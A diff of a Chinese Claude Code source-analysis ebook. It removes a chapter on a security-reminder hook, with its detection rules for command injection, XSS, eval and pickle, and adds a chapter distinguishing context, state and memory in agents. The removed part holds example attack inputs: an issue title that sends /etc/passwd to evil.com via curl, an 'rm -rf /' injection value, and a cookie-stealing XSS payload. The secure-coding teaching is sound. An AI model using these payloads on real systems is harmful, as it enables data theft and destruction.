@@ -1,965 +1,333 @@
----
-title: "第6章：security-guidance - 安全检查 Hook"
-description: "Claude Code 源码解析 - 第6章：security-guidance - 安全检查 Hook"
-contentType: theory
-series: claude-code
-contentId: claude-code-ch06
-shortTitle: "第6章：security-guidance - 安全检查 Hook"
-summary: "Claude Code 源码解析：第6章：security-guidance - 安全检查 Hook"
-difficulty: intermediate
-estimatedTime: 30-45 分钟
-learningGoals:
-  - 理解本章核心实现原理
-  - 掌握相关设计模式
-prerequisites:
-  - 了解 AI Agent 基本概念
-recommendedNext: []
-practiceLinks: []
-searchTags:
-  - claude-code
-  - 源码解析
-navigationLabel: "第6章：security-guidance - 安全检查 Hook"
-entryMode: read-first
-roleDescription: 想深入理解 Claude Code 架构的工程师
----
+# 第 6 章：记忆、状态与上下文，不是一个东西
 
-
-# 第 6 章：security-guidance - 安全检查 Hook
-
-## 本章导读
-
-**仓库路径**：`plugins/security-guidance/`
-
-**系统职责**：
-- 检测 9 种安全模式（SQL 注入/XSS/命令注入等）
-- 在 PreToolUse 阶段提醒用户
-- 维护会话隔离状态
-
-**能学到什么**：
-- 如何设计安全检查规则（正则 + 上下文分析）
-- Hook 的状态管理（会话级变量）
-- 安全提醒的用户体验设计
+> 本章目标：把 Agent 系统里最容易混掉的三个概念拆开：记忆、状态、上下文。  
+> 本章对应总纲：`docs/ebook-outline.md` 中“第 6 章正文写作提纲（2026-03-31 归档）”。
 
 ---
 
-## 6.1 安全检查的必要性
+## 6.1 为什么很多 Agent 讨论一谈到“记忆”就开始变糊
 
-### 常见安全漏洞
+一说到 Agent 的 memory，很多文章立刻就把一堆东西混成一团：
+- 对话历史
+- 长期记忆
+- 用户偏好
+- 任务进度
+- 文件系统状态
+- 检索结果
+- 摘要压缩
 
-**OWASP Top 10（2021）**：
-1. Broken Access Control
-2. Cryptographic Failures
-3. **Injection** ⚠️
-4. Insecure Design
-5. Security Misconfiguration
-6. Vulnerable Components
-7. Authentication Failures
-8. Software and Data Integrity Failures
-9. Security Logging Failures
-10. Server-Side Request Forgery
+最后什么都叫 memory。
 
-**security-guidance 关注的漏洞**：
-- **命令注入**（Command Injection）
-- **XSS**（Cross-Site Scripting）
-- **代码注入**（Code Injection）
-- **反序列化漏洞**（Deserialization）
+这很糟。因为一旦概念不分，工程问题就没法诊断。
 
----
+比如一个系统出问题，到底是：
+- 忘了上一轮做过什么？
+- 不知道当前任务进度？
+- 丢了长期偏好？
+- 还是上下文塞太多，已经读不动了？
 
-### 为什么需要自动检查？
+这些根本不是一个问题。
 
-**场景 1：GitHub Actions 注入**
-```yaml
-# ❌ 危险：直接使用 issue 标题
-name: Process Issue
-on: issues
-jobs:
-  process:
-    runs-on: ubuntu-latest
-    steps:
-      - run: echo "${{ github.event.issue.title }}"
-```
+所以这一章先做一件很朴素的事：
 
-**攻击方式**：
-```
-Issue 标题："; curl http://evil.com/steal?data=$(cat /etc/passwd) #
-```
+> **把记忆、状态、上下文拆开。**
 
-**结果**：执行任意命令，泄露敏感数据。
+不拆开，后面所有“记忆设计”讨论都会飘。
 
 ---
 
-**场景 2：child_process.exec 注入**
-```javascript
-// ❌ 危险：直接拼接用户输入
-const { exec } = require('child_process');
-exec(`git log --author="${userInput}"`);
-```
+## 6.2 先给三个词下最务实的定义
 
-**攻击方式**：
-```
-userInput: "; rm -rf / #
-```
+### 6.2.1 上下文（Context）
 
-**结果**：删除整个文件系统。
+上下文是**当前这一轮判断所能直接看到的信息集合**。
 
----
+它可能包括：
+- 当前用户消息
+- 最近几轮对话
+- 刚刚的工具输出
+- 当前读取到的文件片段
+- 当前任务约束
 
-**场景 3：React XSS**
-```jsx
-// ❌ 危险：直接设置 HTML
-<div dangerouslySetInnerHTML={{ __html: userComment }} />
-```
+上下文的特点是：
+- 离当前决策最近
+- 直接参与模型推理
+- 容量有限
+- 可能随轮次不断变化
 
-**攻击方式**：
-```
-userComment: "<img src=x onerror='alert(document.cookie)'>"
-```
+### 6.2.2 状态（State）
 
-**结果**：窃取用户 Cookie。
+状态是**系统当前运行位置的结构化表示**。
 
----
+它关心的是：
+- 任务进行到哪一步了
+- 哪些动作已经做过
+- 哪些结果已经确认
+- 当前是否处于待确认、待重试、已完成等阶段
 
-### security-guidance 的解决方案
+状态的重点不是“记住内容”，而是“标记系统所处位置”。
 
-**自动检测 + 实时提醒**：
-```
-⚠️ Security Warning: Using child_process.exec() can lead to
-command injection vulnerabilities.
+### 6.2.3 记忆（Memory）
 
-This codebase provides a safer alternative: src/utils/execFileNoThrow.ts
-```
+记忆是**跨轮次、跨阶段、甚至跨会话仍然值得保留的信息**。
 
-**优势**：
-- 实时检测：在代码写入前提醒
-- 零配置：自动启用
-- 教育性：提供安全替代方案
-- 非阻塞：只警告，不阻止
+它可能包括：
+- 用户长期偏好
+- 项目背景事实
+- 稳定工作规则
+- 外部资源位置
+- 已沉淀的经验性约束
+
+记忆的重点不是当前局部判断，而是后续还值得复用。
 
 ---
 
-## 6.2 九种安全模式
+## 6.3 为什么这三个概念不能混用
 
-### 6.2.1 GitHub Actions Workflow 注入
+因为它们回答的是三种完全不同的问题：
 
-**检测条件**：
-```python
-{
-    "ruleName": "github_actions_workflow",
-    "path_check": lambda path: ".github/workflows/" in path
-        and (path.endswith(".yml") or path.endswith(".yaml")),
-    "reminder": "..."
-}
-```
+| 概念 | 回答的问题 | 时间尺度 |
+|------|------------|----------|
+| 上下文 | 我这轮现在看到了什么？ | 短 |
+| 状态 | 我现在运行到哪里了？ | 中 |
+| 记忆 | 哪些信息以后还值得保留？ | 长 |
 
-**高风险输入**：
-- `github.event.issue.title/body`
-- `github.event.pull_request.title/body`
-- `github.event.comment.body`
-- `github.event.commits.*.message`
-- `github.event.head_commit.author.email/name`
-- `github.head_ref`
+这里还要再补一刀：
 
-**安全模式**：
-```yaml
-# ✅ 安全：使用环境变量
-env:
-  TITLE: ${{ github.event.issue.title }}
-run: echo "$TITLE"
-```
+| 相关概念 | 它是什么 | 不是什么 |
+|----------|----------|----------|
+| 外部环境状态 | 文件系统、仓库、接口返回、页面状态等真实世界情况 | 不是系统内部运行状态 |
 
-**参考**：[GitHub Blog - Workflow Injection](https://github.blog/security/vulnerability-research/how-to-catch-github-actions-workflow-injections-before-attackers-do/)
+也就是说：
+- **内部状态** 关心系统自己跑到哪一步
+- **外部环境状态** 关心外部世界现在是什么样
 
----
+两者都会影响决策，但不是一回事。
 
-### 6.2.2 child_process.exec 注入
+如果把它们混在一起，系统很快会出现三类典型垃圾：
 
-**检测子串**：
-```python
-{
-    "ruleName": "child_process_exec",
-    "substrings": ["child_process.exec", "exec(", "execSync("],
-    "reminder": "..."
-}
-```
+### 第一类：该短的不短
 
-**危险示例**：
-```javascript
-const { exec } = require('child_process');
-exec(`command ${userInput}`);  // ❌ 命令注入
-```
+把一堆历史内容一直塞在当前上下文里，结果模型越来越迟钝。
 
-**安全替代**：
-```javascript
-import { execFileNoThrow } from '../utils/execFileNoThrow.js';
-await execFileNoThrow('command', [userInput]);  // ✅ 安全
-```
+### 第二类：该结构化的不结构化
 
-**execFileNoThrow 优势**：
-- 使用 `execFile` 而非 `exec`（防止 shell 注入）
-- 自动处理 Windows 兼容性
-- 结构化输出（stdout/stderr/status）
+本来应该用状态字段表示“当前已完成第 2 步”，结果却让模型从聊天记录里自己猜。
+
+### 第三类：该持久的不持久
+
+用户早就说明过偏好和项目规则，结果系统下一次又全忘了。
+
+这些都不是“记忆能力不够强”，而是概念没分清。
 
 ---
 
-### 6.2.3 new Function() 注入
+## 6.4 上下文：它是当前推理的工作台，不是仓库
 
-**检测子串**：
-```python
-{
-    "ruleName": "new_function_injection",
-    "substrings": ["new Function"],
-    "reminder": "..."
-}
-```
+### 6.4.1 上下文的职责只有一个
 
-**危险示例**：
-```javascript
-const fn = new Function('x', userCode);  // ❌ 代码注入
-fn(42);
-```
+上下文真正的职责很简单：
 
-**安全替代**：
-- 使用 JSON 数据而非代码
-- 使用配置对象而非动态函数
-- 仅在真正需要时使用
+> **为当前这一轮判断提供足够且相关的信息。**
 
----
+注意关键词是“当前”“足够”“相关”。
 
-### 6.2.4 eval() 注入
+它不是越多越好，更不是把能看到的东西全塞进去。
 
-**检测子串**：
-```python
-{
-    "ruleName": "eval_injection",
-    "substrings": ["eval("],
-    "reminder": "..."
-}
-```
+### 6.4.2 为什么上下文膨胀是 Agent 的常见病
 
-**危险示例**：
-```javascript
-eval(userInput);  // ❌ 任意代码执行
-```
+只要任务稍微复杂一点，系统就会积累大量信息：
+- 报错日志
+- 搜索结果
+- 文件内容
+- 中间计划
+- 多轮反馈
 
-**安全替代**：
-```javascript
-JSON.parse(userInput);  // ✅ 仅解析数据
-```
+如果不做筛选和压缩，上下文很快就会膨胀到两个结果：
+- 模型读不动重点
+- 当前判断开始被噪音污染
+
+所以好系统一定会主动处理上下文，而不是任由它无限累积。
+
+### 6.4.3 上下文管理的核心不是“更多”，而是“更准”
+
+很多人一提上下文，就只想到窗口长度。
+
+这太表面了。真正关键的是：
+- 当前信息是否相关
+- 是否保留了关键约束
+- 是否删掉了已经无用的细节
+- 是否把过去的长内容压成了当前可用表示
+
+上下文质量比上下文数量更重要。
 
 ---
 
-### 6.2.5 React dangerouslySetInnerHTML XSS
+## 6.5 状态：系统不靠回忆运行，而靠状态推进
 
-**检测子串**：
-```python
-{
-    "ruleName": "react_dangerously_set_html",
-    "substrings": ["dangerouslySetInnerHTML"],
-    "reminder": "..."
-}
-```
+### 6.5.1 为什么状态层本质上是运行位置标记
 
-**危险示例**：
-```jsx
-<div dangerouslySetInnerHTML={{ __html: userComment }} />  // ❌ XSS
-```
+一个 Agent 如果要持续推进任务，就必须知道自己现在在哪。
 
-**安全替代**：
-```jsx
-import DOMPurify from 'dompurify';
-<div dangerouslySetInnerHTML={{
-  __html: DOMPurify.sanitize(userComment)
-}} />  // ✅ 清理后安全
-```
+这不是文学问题，是运行问题。
 
----
+例如系统必须知道：
+- 当前目标是否已建立
+- 是否已经读过关键文件
+- 当前修改是否已验证
+- 是否正等待用户确认
+- 是继续当前路径，还是已经进入回退分支
 
-### 6.2.6 document.write XSS
+这些都更适合表示为状态，而不是让模型从整段历史对话里反向推理。
 
-**检测子串**：
-```python
-{
-    "ruleName": "document_write_xss",
-    "substrings": ["document.write"],
-    "reminder": "..."
-}
-```
+### 6.5.2 为什么“让模型自己记住”不是好设计
 
-**危险示例**：
-```javascript
-document.write(userInput);  // ❌ XSS + 性能问题
-```
+因为那会把本来明确的运行信息，变成模糊的自然语言猜测。
 
-**安全替代**：
-```javascript
-const div = document.createElement('div');
-div.textContent = userInput;
-document.body.appendChild(div);  // ✅ 安全
-```
+本来你可以直接记录：
+- step = 2
+- test_status = failed
+- waiting_for_user = true
+
+结果你却把这些信息埋进聊天记录里，期待模型每轮都重新理解一遍。
+
+这不是灵活，这是偷懒。
+
+### 6.5.3 状态设计得差，会出现什么问题
+
+最典型的症状有：
+- 重复执行已经做过的动作
+- 忘记当前任务处于哪个阶段
+- 对同一失败反复试错
+- 明明在等用户确认，却继续自动往前跑
+
+这些问题看起来像“智能不够”，其实经常只是状态管理烂。
 
 ---
 
-### 6.2.7 innerHTML XSS
+## 6.6 记忆：不是为了显得聪明，而是为了减少重复成本
 
-**检测子串**：
-```python
-{
-    "ruleName": "innerHTML_xss",
-    "substrings": [".innerHTML =", ".innerHTML="],
-    "reminder": "..."
-}
-```
+### 6.6.1 记忆真正该保存什么
 
-**危险示例**：
-```javascript
-element.innerHTML = userInput;  // ❌ XSS
-```
+记忆并不负责保存所有信息。它应该保留的是那些：
+- 未来还会反复用到
+- 当前代码和仓库状态里不容易直接推出来
+- 对后续协作方式有稳定影响
 
-**安全替代**：
-```javascript
-// 纯文本
-element.textContent = userInput;  // ✅ 安全
+比如：
+- 用户偏好简洁回答
+- 某项目当前的合规约束
+- 某类问题要查哪个外部系统
+- 某团队已有明确工作规则
 
-// HTML 内容
-import DOMPurify from 'dompurify';
-element.innerHTML = DOMPurify.sanitize(userInput);  // ✅ 清理后安全
-```
+### 6.6.2 什么不该进记忆
 
----
+最容易犯的错，就是把一堆临时任务细节也塞进长期记忆。
 
-### 6.2.8 pickle 反序列化
+例如：
+- 这一轮刚跑过哪个命令
+- 某个具体 bug 的临时定位过程
+- 一次性的代码改法
+- 当前会话里的短期上下文
 
-**检测子串**：
-```python
-{
-    "ruleName": "pickle_deserialization",
-    "substrings": ["pickle"],
-    "reminder": "..."
-}
-```
+这些东西通常应该留在状态、计划或当前上下文里，而不是污染长期记忆。
 
-**危险示例**：
-```python
-import pickle
-data = pickle.loads(user_data)  # ❌ 任意代码执行
-```
+### 6.6.3 好记忆的标准
 
-**安全替代**：
-```python
-import json
-data = json.loads(user_data)  # ✅ 仅解析数据
-```
+一个好记忆至少要满足三点：
+- 对未来真的有用
+- 能和当前任务区分开
+- 会被验证和更新，而不是一直陈旧地躺着
+
+记忆不是越多越聪明。烂记忆只会把后续判断越带越偏。
 
 ---
 
-### 6.2.9 os.system 注入
+## 6.7 三者之间到底怎么配合
 
-**检测子串**：
-```python
-{
-    "ruleName": "os_system_injection",
-    "substrings": ["os.system", "from os import system"],
-    "reminder": "..."
-}
-```
+现在把三者放在一条任务链里看，就很清楚了。
 
-**危险示例**：
-```python
-import os
-os.system(f"command {user_input}")  # ❌ 命令注入
-```
+### 当用户发来一个新任务时
+- 当前消息进入上下文
+- 系统建立初始状态
+- 若有相关长期偏好或项目背景，则从记忆里取用
 
-**安全替代**：
-```python
-import subprocess
-subprocess.run(['command', user_input])  # ✅ 安全
-```
+### 当系统执行了几轮动作之后
+- 工具输出进入上下文
+- 任务阶段变化写入状态
+- 如果发现了值得长期保留的事实，才考虑进入记忆
 
----
+### 当上下文过长时
+- 旧内容被压缩
+- 状态继续保留关键运行位置
+- 记忆只保留真正长期有价值的内容
 
-## 6.3 Hook 实现
-
-### 6.3.1 核心数据结构
-
-**安全模式定义**：
-```python
-SECURITY_PATTERNS = [
-    {
-        "ruleName": "github_actions_workflow",
-        "path_check": lambda path: ".github/workflows/" in path
-            and (path.endswith(".yml") or path.endswith(".yaml")),
-        "reminder": "..."
-    },
-    {
-        "ruleName": "child_process_exec",
-        "substrings": ["child_process.exec", "exec(", "execSync("],
-        "reminder": "..."
-    },
-    # ... 其他 7 种模式
-]
-```
-
-**两种检测方式**：
-1. **路径检查**（`path_check`）：基于文件路径
-2. **内容检查**（`substrings`）：基于文件内容
+这就形成了一个很清楚的分工：
+- 上下文负责当前看什么
+- 状态负责当前走到哪
+- 记忆负责以后还要记什么
 
 ---
 
-### 6.3.2 模式匹配逻辑
+## 6.8 为什么很多所谓“记忆系统”其实只是在做检索拼接
 
-```python
-def check_patterns(file_path, content):
-    """检查文件路径或内容是否匹配安全模式"""
-    # 规范化路径（移除前导斜杠）
-    normalized_path = file_path.lstrip("/")
+市场上很多产品喜欢说自己有 memory。
 
-    for pattern in SECURITY_PATTERNS:
-        # 1. 检查路径模式
-        if "path_check" in pattern and pattern["path_check"](normalized_path):
-            return pattern["ruleName"], pattern["reminder"]
+结果你一看，本质上只是：
+- 从历史里检索几段文本
+- 再拼回当前 prompt
 
-        # 2. 检查内容模式
-        if "substrings" in pattern and content:
-            for substring in pattern["substrings"]:
-                if substring in content:
-                    return pattern["ruleName"], pattern["reminder"]
+这当然有用，但它并不自动等于一个成熟记忆系统。
 
-    return None, None
-```
+因为真正的记忆系统还应该回答：
+- 这些内容为什么值得长期保留？
+- 它们什么时候该更新？
+- 过期了怎么办？
+- 和当前状态、当前上下文怎么分工？
 
-**执行流程**：
-```mermaid
-graph TD
-    A[开始检查] --> B[规范化路径]
-    B --> C[遍历安全模式]
-    C --> D{有 path_check?}
-    D -->|是| E{路径匹配?}
-    E -->|是| F[返回规则和提醒]
-    E -->|否| G{有 substrings?}
-    D -->|否| G
-    G -->|是| H{内容匹配?}
-    H -->|是| F
-    H -->|否| I{还有模式?}
-    I -->|是| C
-    I -->|否| J[返回 None]
-
-    style F fill:#FF6347
-    style J fill:#90EE90
-```
+如果这些问题不回答，那很多“记忆能力”其实只是检索增强，不是完整的记忆设计。
 
 ---
 
-### 6.3.3 状态管理
+## 6.9 用 Claude Code 看一个现实里的分层样本
 
-**为什么需要状态？**
+Claude Code 这类系统很适合拿来理解这种分层，因为它明显不是把所有东西都扔进一锅 prompt 里。
 
-避免重复警告：
-```
-# 第一次编辑 auth.js
-⚠️ Security Warning: Using child_process.exec()...
+先看当前系统对“长期保留信息”是怎么设计的。会话里已经明确区分了 `user`、`feedback`、`project`、`reference` 四类 memory，而且要求：
+- 先写到独立 memory 文件
+- 再在 `MEMORY.md` 里做索引
+- 需要时先验证记忆是否仍然与当前代码或资源一致
 
-# 第二次编辑 auth.js（同一会话）
-（不显示警告）
+这套规则本身就在说明：**记忆不是聊天历史，也不是当前执行位置，而是跨会话仍值得保留、还能被校验的事实。**
 
-# 新会话编辑 auth.js
-⚠️ Security Warning: Using child_process.exec()...
-```
+再看当前环境里的任务与计划机制。任务列表、in_progress / completed 状态、计划模式、当前步骤推进，这些显然更接近运行状态层，而不是长期记忆层。它们回答的是“现在跑到哪了”，不是“以后还值得记什么”。
 
-**状态文件**：
-```bash
-~/.claude/security_warnings_state_{session_id}.json
-```
+至于上下文层，就更短平快了：当前用户消息、最近工具输出、刚读到的文件片段、这轮判断所需约束，都会直接进入当前推理工作台。它们最重要的特征不是长期价值，而是**当前轮可见且当前轮相关**。
 
-**格式**：
-```json
-[
-  "/path/to/file-ruleName",
-  "/another/file-anotherRule"
-]
-```
+如果再往源码样本上压一层，`examples/settings/settings-strict.json:1` 也在提醒你一个常被忽略的事实：系统运行边界本身也是上下文和状态管理的一部分。因为当前到底允许不允许 `Bash`、能不能访问 `WebSearch` / `WebFetch`，会直接改变这轮判断可选的动作空间。
 
-**状态键格式**：`{file_path}-{ruleName}`
+所以从 Claude Code 这个样本里，至少能抽出几条非常硬的分层规则：
+- **当前轮直接参与推理的信息，放上下文层**
+- **任务推进位置和阶段信号，放状态层**
+- **跨会话仍值得复用、且代码里不容易直接推出的事实，才放记忆层**
+- **外部世界本身的真实情况，要单独看作环境状态，别和内部运行状态混掉**
+- **所有长期信息都应该允许校验和更新，别把记忆当神谕**
+
+这个例子的价值，不只是印证概念区别，而是告诉你：现实里的 Agent 系统如果不把不同时间尺度、不同作用范围的信息拆开管理，后面一定会越来越乱。
 
 ---
 
-**状态加载**：
-```python
-def load_state(session_id):
-    """加载已显示的警告状态"""
-    state_file = get_state_file(session_id)
-    if os.path.exists(state_file):
-        try:
-            with open(state_file, "r") as f:
-                return set(json.load(f))
-        except (json.JSONDecodeError, IOError):
-            return set()
-    return set()
-```
+## 6.10 本章小结
 
-**状态保存**：
-```python
-def save_state(session_id, shown_warnings):
-    """保存已显示的警告状态"""
-    state_file = get_state_file(session_id)
-    try:
-        os.makedirs(os.path.dirname(state_file), exist_ok=True)
-        with open(state_file, "w") as f:
-            json.dump(list(shown_warnings), f)
-    except IOError as e:
-        debug_log(f"Failed to save state file: {e}")
-        pass  # 静默失败
-```
+这一章最关键的事，是把三个经常被混用的词拆开。
 
----
+你现在应该记住六件事：
 
-### 6.3.4 自动清理
+1. **上下文是当前推理的工作台，不是长期仓库。**
+2. **状态是系统运行位置的表示，不该靠聊天记录反推。**
+3. **记忆保存的是未来还值得复用的信息，而不是所有历史。**
+4. **把三者混在一起，会直接造成上下文污染、状态混乱和长期记忆失真。**
+5. **很多所谓 memory 系统，其实只是检索拼接，不等于完整记忆设计。**
+6. **成熟 Agent 的关键，不是“记得更多”，而是“分层更清楚”。**
 
-**清理策略**：
-- 10% 概率触发清理
-- 删除 30 天前的状态文件
-
-```python
-def cleanup_old_state_files():
-    """删除 30 天前的状态文件"""
-    try:
-        state_dir = os.path.expanduser("~/.claude")
-        if not os.path.exists(state_dir):
-            return
-
-        current_time = datetime.now().timestamp()
-        thirty_days_ago = current_time - (30 * 24 * 60 * 60)
-
-        for filename in os.listdir(state_dir):
-            if filename.startswith("security_warnings_state_"):
-                file_path = os.path.join(state_dir, filename)
-                try:
-                    file_mtime = os.path.getmtime(file_path)
-                    if file_mtime < thirty_days_ago:
-                        os.remove(file_path)
-                except (OSError, IOError):
-                    pass  # 忽略单个文件的清理错误
-    except Exception:
-        pass  # 静默忽略清理错误
-```
-
-**为什么 10% 概率？**
-- 避免每次都执行（性能）
-- 最终一致性（30 天内会被清理）
-- 简单有效
-
----
-
-### 6.3.5 Hook 执行流程
-
-```mermaid
-sequenceDiagram
-    participant Claude
-    participant Hook
-    participant State
-    participant Tool
-
-    Claude->>Hook: PreToolUse（Edit/Write）
-    Hook->>Hook: 读取 stdin（JSON）
-    Hook->>Hook: 提取文件路径和内容
-    Hook->>Hook: 检查安全模式
-    alt 匹配安全模式
-        Hook->>State: 加载状态
-        State-->>Hook: 返回已显示的警告
-        Hook->>Hook: 检查是否已警告
-        alt 未警告过
-            Hook->>Claude: 输出警告消息
-            Hook->>State: 保存新状态
-            Hook->>Claude: 退出码 0（允许执行）
-        else 已警告过
-            Hook->>Claude: 退出码 0（允许执行）
-        end
-    else 无匹配模式
-        Hook->>Claude: 退出码 0（允许执行）
-    end
-    Claude->>Tool: 执行工具
-    Tool-->>Claude: 返回结果
-```
-
----
-
-## 6.4 错误处理与调试
-
-### 6.4.1 优雅降级
-
-**设计原则**：Hook 错误不应阻止用户操作。
-
-**错误场景**：
-1. JSON 解析失败
-2. 状态文件读写失败
-3. 日志写入失败
-
-**处理方式**：
-```python
-try:
-    # 主逻辑
-    input_data = json.load(sys.stdin)
-    # ...
-except json.JSONDecodeError as e:
-    debug_log(f"JSON parse error: {e}")
-    sys.exit(0)  # 允许操作
-except Exception as e:
-    debug_log(f"Unexpected error: {e}")
-    sys.exit(0)  # 允许操作
-```
-
-**为什么始终退出 0？**
-
-**Linus 式思考**：
-> "安全检查是辅助功能，不是核心功能。如果检查失败，用户应该能继续工作，而不是被卡住。"
-
----
-
-### 6.4.2 调试日志
-
-**日志文件**：`/tmp/security-warnings-log.txt`
-
-**日志内容**：
-```
-[2026-03-13 10:30:45.123] JSON parse error: Expecting value: line 1 column 1 (char 0)
-[2026-03-13 10:31:20.456] Failed to save state file: [Errno 13] Permission denied
-```
-
-**日志函数**：
-```python
-def debug_log(message):
-    """追加调试消息到日志文件"""
-    try:
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
-        with open(DEBUG_LOG_FILE, "a") as f:
-            f.write(f"[{timestamp}] {message}\n")
-    except Exception:
-        pass  # 静默忽略日志错误
-```
-
-**为什么静默失败？**
-- 日志是调试工具，不是核心功能
-- 日志失败不应影响 Hook 执行
-- 避免级联错误
-
----
-
-## 6.5 配置与控制
-
-### 6.5.1 环境变量
-
-**禁用安全提醒**：
-```bash
-export ENABLE_SECURITY_REMINDER=0
-claude
-```
-
-**检查逻辑**：
-```python
-if os.environ.get("ENABLE_SECURITY_REMINDER", "1") == "0":
-    sys.exit(0)  # 直接退出，不检查
-```
-
----
-
-### 6.5.2 Hook 配置
-
-**文件**：`hooks/hooks.json`
-
-```json
-{
-  "hooks": {
-    "PreToolUse": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "python3 ${CLAUDE_PLUGIN_ROOT}/hooks/security_reminder_hook.py"
-          }
-        ],
-        "matcher": "Edit|Write|MultiEdit"
-      }
-    ]
-  }
-}
-```
-
-**关键字段**：
-- `PreToolUse` - Hook 类型
-- `matcher` - 工具匹配器（Edit/Write/MultiEdit）
-- `command` - 执行命令
-
----
-
-## 6.6 实践：测试安全检查
-
-### 任务 1：GitHub Actions 注入检测
-
-**创建文件**：`.github/workflows/test.yml`
-
-```yaml
-name: Test Workflow
-on: issues
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - run: echo "${{ github.event.issue.title }}"
-```
-
-**预期输出**：
-```
-⚠️ Security Warning: You are editing a GitHub Actions workflow file.
-
-Be aware of these security risks:
-1. Command Injection: Never use untrusted input directly in run: commands
-2. Use environment variables: Instead of ${{ github.event.issue.title }}, use env:
-
-Example of SAFE pattern:
-env:
-  TITLE: ${{ github.event.issue.title }}
-run: echo "$TITLE"
-```
-
----
-
-### 任务 2：child_process.exec 检测
-
-**创建文件**：`src/utils.js`
-
-```javascript
-const { exec } = require('child_process');
-
-function runCommand(userInput) {
-  exec(`git log --author="${userInput}"`);
-}
-```
-
-**预期输出**：
-```
-⚠️ Security Warning: Using child_process.exec() can lead to
-command injection vulnerabilities.
-
-This codebase provides a safer alternative: src/utils/execFileNoThrow.ts
-
-Instead of:
-  exec(`command ${userInput}`)
-
-Use:
-  import { execFileNoThrow } from '../utils/execFileNoThrow.js'
-  await execFileNoThrow('command', [userInput])
-```
-
----
-
-### 任务 3：React XSS 检测
-
-**创建文件**：`src/Comment.jsx`
-
-```jsx
-function Comment({ userComment }) {
-  return (
-    <div dangerouslySetInnerHTML={{ __html: userComment }} />
-  );
-}
-```
-
-**预期输出**：
-```
-⚠️ Security Warning: dangerouslySetInnerHTML can lead to XSS
-vulnerabilities if used with untrusted content.
-
-Ensure all content is properly sanitized using an HTML sanitizer
-library like DOMPurify, or use safe alternatives.
-```
-
----
-
-### 任务 4：验证状态管理
-
-**步骤 1**：编辑 `src/utils.js`（包含 `exec(`）
-```
-⚠️ Security Warning: Using child_process.exec()...
-```
-
-**步骤 2**：再次编辑 `src/utils.js`（同一会话）
-```
-（无警告）
-```
-
-**步骤 3**：编辑 `src/api.js`（包含 `exec(`）
-```
-⚠️ Security Warning: Using child_process.exec()...
-```
-
-**步骤 4**：重启 Claude Code，编辑 `src/utils.js`
-```
-⚠️ Security Warning: Using child_process.exec()...
-（新会话，重新警告）
-```
-
----
-
-## 6.7 架构洞察
-
-### 洞察 1：检测 vs 阻止
-
-**为什么只警告，不阻止？**
-
-**选项 1：阻止执行**
-```python
-if matches_security_pattern:
-    print("⚠️ Security Warning: ...")
-    sys.exit(2)  # 阻止执行
-```
-
-**选项 2：只警告**
-```python
-if matches_security_pattern:
-    print("⚠️ Security Warning: ...")
-    sys.exit(0)  # 允许执行
-```
-
-**Linus 式思考**：
-> "工具应该帮助用户，而不是阻碍用户。有时候用户知道自己在做什么，强制阻止会让他们无法工作。"
-
-**权衡**：
-- **阻止**：更安全，但可能误报
-- **警告**：更灵活，用户自己决定
-
-**security-guidance 选择警告**：
-- 教育性：提供安全替代方案
-- 灵活性：用户可以选择忽略
-- 非侵入性：不打断工作流
-
----
-
-### 洞察 2：会话隔离的价值
-
-**为什么需要会话隔离？**
-
-**场景**：
-```
-会话 A：编辑 auth.js（警告）
-会话 B：编辑 auth.js（应该再次警告）
-```
-
-**如果共享状态**：
-```
-会话 A：编辑 auth.js（警告）
-会话 B：编辑 auth.js（不警告）← 错误！
-```
-
-**Linus 式思考**：
-> "会话是独立的。不同会话的用户可能是不同的人，或者同一个人但忘记了之前的警告。"
-
-**实现**：
-```python
-state_file = f"~/.claude/security_warnings_state_{session_id}.json"
-```
-
-**优势**：
-- 每个会话独立
-- 不会遗漏警告
-- 符合用户预期
-
----
-
-### 洞察 3：10% 清理概率
-
-**为什么不是 100%？**
-
-**选项 1：每次都清理**
-```python
-cleanup_old_state_files()  # 每次执行
-```
-
-**选项 2：10% 概率清理**
-```python
-if random.random() < 0.1:
-    cleanup_old_state_files()
-```
-
-**Linus 式思考**：
-> "清理是维护任务，不是核心任务。每次都清理浪费性能。10% 概率足够了，最终会被清理。"
-
-**性能对比**：
-```
-每次清理：100 次执行 = 100 次清理（浪费）
-10% 清理：100 次执行 = 10 次清理（足够）
-```
-
-**权衡**：
-- 性能：减少 90% 的清理开销
-- 有效性：30 天内会被清理（最终一致性）
-- 简单性：无需复杂的调度机制
-
----
-
-## 6.8 小结
-
-### 核心要点
-
-1. **九种安全模式**：
-   - GitHub Actions 注入
-   - child_process.exec 注入
-   - new Function() 注入
-   - eval() 注入
-   - React XSS（dangerouslySetInnerHTML）
-   - document.write XSS
-   - innerHTML XSS
-   - pickle 反序列化
-   - os.system 注入
-
-2. **PreToolUse Hook**：
-   - 拦截 Edit/Write/MultiEdit 工具
-   - 检查路径和内容
-   - 显示警告但允许执行
-
-3. **状态管理**：
-   - 会话隔离（基于 session_id）
-   - 避免重复警告
-   - 自动清理（10% 概率，30 天）
-
-4. **优雅降级**：
-   - Hook 错误不阻止用户操作
-   - 始终退出 0
-   - 静默失败
-
-### 与其他章节的关联
-
-- **第 2 章**：理解了 Hook 的概念，现在看到安全检查的实现
-- **第 3 章**：理解了安全策略，security-guidance 是具体实现
-- **第 4 章**：hookify 是规则引擎，security-guidance 是安全检查
-- **第 18 章**：深入研究安全策略与沙箱设计
-
-### 延伸阅读
-
-- [plugins/security-guidance/CLAUDE.md](/plugins/security-guidance/CLAUDE) - security-guidance 文档
-- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - 安全漏洞排行
-- [GitHub Actions Security](https://github.blog/security/vulnerability-research/how-to-catch-github-actions-workflow-injections-before-attackers-do/) - 工作流注入
-
----
-
-## 🎉 恭喜！入门线完成
-
-你已经完成了**入门线**（第 1-6 章）的学习！
-
-**学习成果**：
-- ✅ 理解 Claude Code 的整体架构
-- ✅ 掌握插件系统的四大组件
-- ✅ 了解三种安全策略
-- ✅ 学会规则引擎的实现（hookify）
-- ✅ 掌握 Git 工作流自动化（commit-commands）
-- ✅ 理解安全检查的实现（security-guidance）
-
-**下一步**：
-- [🟡 实战线](/docs/guide/learning-paths#实战路径) - 学习复杂插件的实现
-- [🔴 进阶线](/docs/guide/learning-paths#进阶路径) - 研究自动化架构
-- [🛠️ 插件开发路径](/docs/guide/learning-paths#插件开发路径) - 开发自己的插件
-
----
-
-## 下一章
-
